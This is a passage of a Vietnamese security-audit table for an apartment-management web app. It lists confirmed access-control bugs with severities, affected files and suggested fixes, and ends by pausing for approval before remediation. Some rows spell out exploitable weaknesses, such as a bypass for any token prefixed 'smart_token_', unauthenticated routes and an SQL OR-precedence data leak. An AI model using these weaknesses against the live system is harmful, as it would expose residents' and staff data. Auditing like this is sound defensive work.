| 26 | Module 6 (Res. Visitors) | Role `STAFF`/`RECEPTIONIST` cứng được sửa/hủy khách của cư dân; routes thiếu `auth.bearer` middleware | MEDIUM | `app/Services/ResidentVisitorService.php`, `routes/web.php` | CONFIRMED BUG | Kiểm tra permission thay vì role cứng; bọc `auth.bearer` trên route group |
| 27 | Module 7 (Rec. Visitors) | `assertStaffAuthorized` trả về sớm theo role trước khi check permission -> `VISITOR:VIEW` vẫn check-in/out được | HIGH | `app/Services/ReceptionVisitorService.php` | CONFIRMED BUG | Chỉ cho `SUPER_ADMIN` bypass; các role khác phải qua `RbacService::hasPermission()` |
| 28 | Module 7 (Rec. Overview) | `ReceptionPortalController::overview` thiếu auth check hoàn toàn và trả số liệu giả khi DB trống *(file shared)* | HIGH | `app/Http/Controllers/ReceptionPortalController.php`, `routes/web.php` | CONFIRMED BUG | Bọc `auth.bearer:strict` + check quyền lễ tân; bỏ số liệu giả hardcode (`18`, `42`, `A1001`) |
| 29 | Module 7 (Dashboard) | `ReceptionDashboardService` check quyền bằng role và route `/reception/dashboard`, `/reception/visitors*` thiếu `auth.bearer` | MEDIUM | `app/Services/ReceptionDashboardService.php`, `routes/web.php` | CONFIRMED BUG | Kiểm tra permission và thêm `auth.bearer` trên route |
| 30 | Module 8 & 9 (Parcels) | `assertStaffAuthorized` ưu tiên role trước khi check `PARCEL:*` (`PARCEL:RECEIVE/CHECKOUT/UPDATE/DELETE` chưa seed) | HIGH | `app/Services/ReceptionParcelService.php` | CONFIRMED BUG | Enforce `RbacService::hasPermission($user, $permCode)` và seed đầy đủ `PARCEL:*` |
| 31 | Module 8 (Parcels) | `getParcels` lộ KPI toàn tòa nhà cho Cư dân; `resolveResidentApartmentIds` thiếu check hết hạn & `apartment_owners` | MEDIUM | `app/Services/ReceptionParcelService.php` | CONFIRMED BUG | Lọc KPI theo `$apartmentIds` của cư dân; dùng chung logic BUG-05 trong `QuocTinRealtimeService::getAuthorizedApartmentIds()` |
| 32 | Module 8 & 9 (Parcels) | `updateParcel` không dùng transaction/`lockForUpdate` chống race với `handoverParcel`; `localStorage` cache không clear theo user | MEDIUM / LOW | `app/Services/ReceptionParcelService.php`, `ReceptionParcelPanel.tsx` | CONFIRMED BUG | Bọc `DB::transaction` + `lockForUpdate` trong `updateParcel`; gắn user ID và clear cache khi logout |
| 33 | Module 10 (Pricing) | BẤT KỲ user có token bắt đầu bằng `smart_token_` đều bypass `checkAdminAuthorization()` *(file Xuân Hòa)* | CRITICAL | `app/Http/Controllers/ServicePricingController.php` | CONFIRMED BUG *(Teammate file)* | **Đề xuất báo Xuân Hòa sửa:** Xóa bỏ `str_starts_with($bearerToken(), 'smart_token_')` bypass |
| 34 | Module 10 (Pricing) | `index()` không auth, `INVOICE:VIEW`/`PRICING:VIEW` sửa/xóa được biểu phí, `/vehicles/pricing-config` mở Public *(Xuân Hòa)* | HIGH | `app/Http/Controllers/ServicePricingController.php`, `routes/web.php` | CONFIRMED BUG *(Teammate file)* | **Đề xuất sửa:** Truyền permission theo action (`PRICING:VIEW`/`CREATE`/`UPDATE`/`DELETE`), bảo vệ `index()` và `pricingConfig` |
| 35 | Module 10 (Pricing) | Không validate `effective_to_date >= effective_from_date`, sửa đè lịch sử tier & không xóa cache giá xe *(Xuân Hòa)* | MEDIUM | `app/Http/Controllers/ServicePricingController.php`, `app/Services/ServicePricingService.php` | CONFIRMED BUG *(Teammate file)* | **Đề xuất sửa:** Tạo config phiên bản mới thay vì sửa đè bảng gắn hóa đơn cũ; xóa cache giá xe |
| 36 | Module 11 (Schedules) | `authorizeManager`/`authorizeViewer` chỉ check role, route thiếu `auth.bearer` & `cooldown:schedules`, `VIEWER` lấy PII staff | HIGH | `app/Http/Controllers/StaffScheduleController.php`, `routes/web.php` | CONFIRMED BUG | Bọc `auth.bearer`, seed và check `SCHEDULE:*`, tách quyền xem danh sách nhân sự nhạy cảm |
| 37 | Module 11 (Schedules UI) | UI thiếu chế độ Week View (chỉ có Month View) và không check quyền `usePermission()` | MEDIUM | `resources/js/Components/ManagementStaffSchedulePanel.tsx` | CONFIRMED BUG | Bổ sung nút toggle Week/Month View và kiểm tra `can()` |
| 38 | Module 12 (Realtime) | `filterEventsForResident()` trả nguyên event `vehicles`, `residents`, `temporary-registrations` của toàn chung cư cho cư dân | CRITICAL | `app/Services/QuocTinRealtimeService.php` | CONFIRMED BUG | Lọc bắt buộc theo `$allowedApartmentIds` tương tự `parcels` và `visitors` |
| 39 | Module 12 (Search) | `dbSearchResidents()` dính lỗi ưu tiên toán tử SQL `OR` khiến fallback MySQL lộ cư dân của mọi căn hộ | HIGH | `app/Services/Search/GlobalSearchService.php` | CONFIRMED BUG | Bọc chuỗi `whereHas`/`orWhereHas` vào closure `where(function ($q) ...)` trước `whereIn('apartment_id', ...)` |
| 40 | Module 12 (Search) | `DEV`/`TECHNICIAN` được cấp quyền xem toàn tòa nhà sai chuẩn; dùng mã quyền không tồn tại; `TemporaryRegistration` thiếu `resident_user_id` trong index | HIGH | `app/Services/Search/GlobalSearchService.php`, `app/Models/TemporaryRegistration.php` | CONFIRMED BUG | Bỏ role bypass cứng cho `DEV`/`TECHNICIAN`, chuẩn hóa mã quyền và thêm `resident_user_id` vào `toSearchableArray()` |
| 41 | Module 12 (Frontend) | Các API service tự fallback bearer token `smart_token_*_demo` và thiếu `usePermission()` ở toàn bộ UI Module 2–11 | MEDIUM / LOW | `resources/js/Services/*.ts`, `resources/js/Pages/Admin/*.tsx`, `resources/js/Components/*.tsx` | CONFIRMED BUG | Bỏ gán `smart_token_*_demo` khi không đăng nhập; tích hợp `usePermission()` cho tất cả màn hình |

---

> **TRẠNG THÁI:** Hoàn tất giai đoạn Kiểm toán Độc lập (BUG-04 Stage 2B). **ĐANG DỪNG CHỜ PHÊ DUYỆT CỦA BẠN TRƯỚC KHI CHUYỂN SANG BƯỚC KHẮC PHỤC (IMPLEMENTATION).**
